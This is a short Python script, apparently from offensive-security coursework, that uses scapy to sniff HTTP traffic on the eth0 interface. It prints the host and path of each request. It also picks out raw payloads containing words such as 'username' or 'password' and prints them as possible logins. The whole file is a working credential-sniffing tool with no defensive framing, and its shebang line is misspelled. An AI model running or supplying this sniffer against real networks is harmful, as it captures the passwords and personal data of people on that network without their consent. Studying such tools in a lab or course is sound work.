#!use/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "user", "login", "name", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        # printf(packet.show()) IT WILL HELPS US TO KNOW WHAT INFO WE CAN GET AND USE IT
        url = get_url(packet)
        print("[+] HTTP Request >> ", str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n")


sniff("eth0")
